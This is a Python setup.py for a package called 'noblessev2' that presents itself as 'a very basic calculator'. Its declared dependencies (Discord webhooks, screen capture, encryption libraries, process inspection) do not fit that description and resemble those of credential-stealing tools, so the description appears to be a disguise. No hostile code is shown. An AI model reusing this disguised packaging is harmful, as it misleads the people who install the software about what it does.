from setuptools import setup, find_packages
 
classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]
 
setup(
  name='noblessev2',
  version='0.0.2',
  description='A very basic calculator',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='misery',
  author_email='predicc@protonmail.com',
  license='MIT', 
  classifiers=classifiers,
  keywords='noblessev2', 
  packages=find_packages(),
  install_requires=[
    'requests',
    'colorama',
    'discord',
    'asyncio',
    'datetime',
    'youtube_dl',
    'importlib_metadata',
    'mss',
    'pycryptodome',
    'pillow',
    'dhooks',
    'psutil',
    'discord.py==1.5.0',
    'cryptography'
    ] 
)
